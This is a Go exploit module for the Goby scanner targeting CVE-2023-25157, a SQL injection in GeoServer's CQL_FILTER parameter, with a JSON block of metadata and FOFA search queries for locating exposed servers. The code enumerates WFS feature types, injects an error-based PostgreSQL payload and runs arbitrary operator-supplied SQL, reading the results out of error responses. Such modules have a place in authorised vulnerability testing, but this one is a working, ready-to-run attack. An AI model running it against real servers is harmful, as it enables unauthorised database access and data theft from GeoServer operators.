package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GeoServer ttypeName CQL_FILTER parameter SQL injection vulnerability (CVE-2023-25157)",
    "Description": "<p>GeoServer is an open source map server. It is a J2EE implementation that follows the OpenGIS Web server specification. Through it, map data can be easily published as map services and geospatial data can be shared among users.</p><p>In GeoServer versions prior to 2.22.1 and 2.21.4, a SQL injection issue was discovered in filter and function expressions defined by the Open Geospatial Consortium (OGC) standard that could be exploited by an unauthenticated attacker. Perform SQL injection and execute malicious code.</p>",
    "Product": "GeoServer",
    "Homepage": "https://sourceforge.net/projects/geoserver/",
    "DisclosureDate": "2023-02-21",
    "Author": "xxyizhiai@163.com",
    "FofaQuery": "body=\"/org.geoserver.web.GeoServerBasePage/\" || body=\"class=\\\"geoserver lebeg\" || body=\"/webapps/geoserver\" || (body=\"window.location.replace(\\\"web/\\\");\" && body=\"geoserver\") || title=\"GeoServer\"",
    "GobyQuery": "body=\"/org.geoserver.web.GeoServerBasePage/\" || body=\"class=\\\"geoserver lebeg\" || body=\"/webapps/geoserver\" || (body=\"window.location.replace(\\\"web/\\\");\" && body=\"geoserver\") || title=\"GeoServer\"",
    "Level": "3",
    "Impact": "<p>In GeoServer versions prior to 2.22.1 and 2.21.4, a SQL injection issue was discovered in filter and function expressions defined by the Open Geospatial Consortium (OGC) standard that could be exploited by an unauthenticated attacker. Perform SQL injection and execute malicious code.</p>",
    "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability: <a href=\"https://sourceforge.net/projects/geoserver/\">https://sourceforge.net/projects/geoserver/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [
        "https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "SELECT version()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2023-25157"
    ],
    "CNNVD": [
        "CNNVD-202302-1717"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "GeoServer ttypeName CQL_FILTER 参数 SQL注入漏洞（CVE-2023-25157）",
            "Product": "GeoServer",
            "Description": "<p>GeoServer 是一个开源的地图服务器，它是遵循OpenGIS Web服务器规范的J2EE实现，通过它可以方便的将地图数据发布为地图服务，实现地理空间数据在用户之间的共享。</p><p>GeoServer 在 2.22.1 和 2.21.4 之前的版本中，在开放地理空间联盟 （OGC） 标准定义的过滤器和函数表达式中发现了一个 SQL 注入问题，未经身份验证的攻击者可以利用该漏洞进行SQL注入，执行恶意代码。</p>",
            "Recommendation": "<p>1、请升级系统到最新版本，联系厂商修复漏洞：<a href=\"https://sourceforge.net/projects/geoserver/\">https://sourceforge.net/projects/geoserver/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>GeoServer 在 2.22.1 和 2.21.4 之前的版本中，在开放地理空间联盟 （OGC） 标准定义的过滤器和函数表达式中发现了一个 SQL 注入问题，未经身份验证的攻击者可以利用该漏洞进行SQL注入，执行恶意代码。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "GeoServer ttypeName CQL_FILTER parameter SQL injection vulnerability (CVE-2023-25157)",
            "Product": "GeoServer",
            "Description": "<p>GeoServer is an open source map server. It is a J2EE implementation that follows the OpenGIS Web server specification. Through it, map data can be easily published as map services and geospatial data can be shared among users.</p><p>In GeoServer versions prior to 2.22.1 and 2.21.4, a SQL injection issue was discovered in filter and function expressions defined by the Open Geospatial Consortium (OGC) standard that could be exploited by an unauthenticated attacker. Perform SQL injection and execute malicious code.</p>",
            "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability: <a href=\"https://sourceforge.net/projects/geoserver/\">https://sourceforge.net/projects/geoserver/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>In GeoServer versions prior to 2.22.1 and 2.21.4, a SQL injection issue was discovered in filter and function expressions defined by the Open Geospatial Consortium (OGC) standard that could be exploited by an unauthenticated attacker. Perform SQL injection and execute malicious code.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10905"
}`

	sendPayloadFlagHa2Dzl := func(hostInfo *httpclient.FixUrl, sql string, doSomething func(resp *httpclient.HttpResponse) bool) (*httpclient.HttpResponse, error) {
		capabilitiesRequestConfig := httpclient.NewGetRequestConfig(`/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities`)
		capabilitiesRequestConfig.VerifyTls = false
		capabilitiesRequestConfig.FollowRedirect = true
		capabilitiesTypeResp, capabilitiesTypeErr := httpclient.DoHttpRequest(hostInfo, capabilitiesRequestConfig)
		capabilitiesRegexp := regexp.MustCompile(`<FeatureType><Name>(.*?)<\/Name>`)
		if capabilitiesTypeErr != nil && capabilitiesTypeResp == nil {
			return nil, capabilitiesTypeErr
		} else if capabilitiesTypeResp != nil && capabilitiesTypeResp.StatusCode != 200 && len(capabilitiesRegexp.FindAllStringSubmatch(capabilitiesTypeResp.RawBody, -1)) < 1 {
			return nil, errors.New("漏洞利用失败")
		}
		featureTypes := capabilitiesRegexp.FindAllStringSubmatch(capabilitiesTypeResp.RawBody, -1)
		for _, featureType := range featureTypes {
			if len(featureType) < 1 {
				continue
			}
			feature := featureType[1]
			featureTypeRequestConfig := httpclient.NewPostRequestConfig("/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=" + feature + "&maxFeatures=1&outputFormat=json")
			featureTypeRequestConfig.VerifyTls = false
			featureTypeRequestConfig.FollowRedirect = true
			featureTypeResp, featureTypeErr := httpclient.DoHttpRequest(hostInfo, featureTypeRequestConfig)
			if featureTypeErr != nil && featureTypeResp == nil {
				return nil, featureTypeErr
			} else if featureTypeResp != nil && featureTypeResp.StatusCode != 200 {
				return nil, errors.New("漏洞利用失败")
			}
			var featureTypeRespJson map[string]interface{}
			err := json.Unmarshal([]byte(featureTypeResp.Utf8Html), &featureTypeRespJson)
			if err != nil {
				continue
			}
			features, ok := featureTypeRespJson["features"].([]interface{})
			if !ok || len(features) == 0 {
				continue
			}
			properties := features[0].(map[string]interface{})["properties"].(map[string]interface{})
			for property := range properties {
				payloadRequestConfig := httpclient.NewPostRequestConfig("/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=" + feature + "&CQL_FILTER=" + url.QueryEscape("strStartsWith("+property+",'x'') = true and 1="+"(SELECT CAST (("+sql+") AS INTEGER)) -- ') = true"))
				payloadRequestConfig.VerifyTls = false
				payloadRequestConfig.FollowRedirect = false
				if resp, err := httpclient.DoHttpRequest(hostInfo, payloadRequestConfig); resp == nil && err != nil {
					return nil, err
				} else if resp != nil && resp.StatusCode == 200 && doSomething(resp) {
					return resp, nil
				}
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadFlagHa2Dzl(hostInfo, `SELECT version()`, func(resp *httpclient.HttpResponse) bool {
				return resp != nil && strings.Contains(resp.Utf8Html, `PostgreSQL`) && strings.Contains(resp.Utf8Html, `invalid input syntax for integer:`)
			})
			return resp != nil && strings.Contains(resp.Utf8Html, `PostgreSQL`) && strings.Contains(resp.Utf8Html, `invalid input syntax for integer:`)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {
				resultRegexp := regexp.MustCompile(`java.io.IOExceptionorg.postgresql.util.PSQLException: ERROR: invalid input syntax for integer: &quot;(.*?)&quot;`)
				if resp, err := sendPayloadFlagHa2Dzl(expResult.HostInfo, sql, func(resp *httpclient.HttpResponse) bool {
					return resp != nil && len(resultRegexp.FindStringSubmatch(resp.RawBody)) > 1
				}); resp != nil && len(resultRegexp.FindStringSubmatch(resp.RawBody)) > 1 {
					expResult.Success = true
					expResult.Output = resultRegexp.FindStringSubmatch(resp.RawBody)[1]
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				if resp, err := sendPayloadFlagHa2Dzl(expResult.HostInfo, `SELECT version()`, func(resp *httpclient.HttpResponse) bool {
					success := resp != nil && strings.Contains(resp.Utf8Html, `PostgreSQL`) && strings.Contains(resp.Utf8Html, `invalid input syntax for integer:`)
					if success {
						expResult.Output = `POST ` + resp.Request.URL.Path + `?` + resp.Request.URL.RawQuery + ` HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
Connection: close`
					}
					return success
				}); resp != nil && strings.Contains(resp.Utf8Html, `PostgreSQL`) && strings.Contains(resp.Utf8Html, `invalid input syntax for integer:`) {
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
